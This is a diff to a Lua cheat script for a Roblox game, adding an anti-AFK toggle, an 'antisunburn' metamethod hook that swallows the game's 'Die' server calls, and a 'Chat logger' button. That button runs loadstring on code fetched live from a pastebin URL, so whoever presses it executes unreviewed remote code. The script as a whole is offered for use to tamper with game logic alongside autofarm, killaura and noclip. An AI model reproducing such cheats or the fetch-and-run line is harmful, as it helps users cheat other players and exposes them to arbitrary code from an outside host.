@@ -2,6 +2,7 @@ getgenv().autofarm = true
 getgenv().noclip = false
 getgenv().killaura = true
 getgenv().killauraford = true
+getgenv().antiafk = true
 local npcTable = {}
 local areaTable = {}
 local mobTable = {
@@ -13,6 +14,43 @@ local mobTable = {
 "TypeZero"
 
 }
+local function antisunburn()
+    spawn(function()
+    local __Namecall
+    __Namecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
+        local Args, Method = {...}, getnamecallmethod()
+        
+        if tostring(self.Name):match('Die') and tostring(Method):match('FireServer') then
+            return
+        end
+        
+        return __Namecall(self, ...)
+    end))
+
+end)
+end
+
+local function chatlogger()
+spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/stggPUBM", true))()
+end)
+end
+
+local function antiafk()
+    spawn(function()
+if getgenv().antiafk == true then
+while getgenv().antiafk do task.wait()
+    for _, v in next, getconnections(game:GetService("Players").LocalPlayer.Idled) do
+        v:Disable()
+    end
+end
+
+else
+    return
+end
+
+end)
+end
 
 local function findkey()
 if game:GetService("Workspace").Keys:FindFirstChild("Key") then
@@ -222,6 +260,21 @@ Section:NewToggle("Noclip toggle", "ToggleInfo", function(state)
         noclip()
     end
 end)
+Section:NewToggle("Antiafk toggle", "ToggleInfo", function(state)
+    if state then
+        getgenv().antiafk = true
+       antiafk()
+    else
+        getgenv().antiafk = false
+        antiafk()
+    end
+end)
+Section:NewButton("Antisunburn", "ButtonInfo", function()
+    antisunburn()
+ end)
+ 
+
+
 Section:NewButton("Instant teleport to key", "ButtonInfo", function()
    findkey()
 end)
@@ -238,5 +291,8 @@ local Section = Tab:NewSection("Ui binds")
 
 Section:NewKeybind("Ui toggle", "KeybindInfo", Enum.KeyCode.X, function()
 	Library:ToggleUI()
+end)
+Section:NewButton("Chat logger", "Chat logger", function()
+    chatlogger()
 end)
 
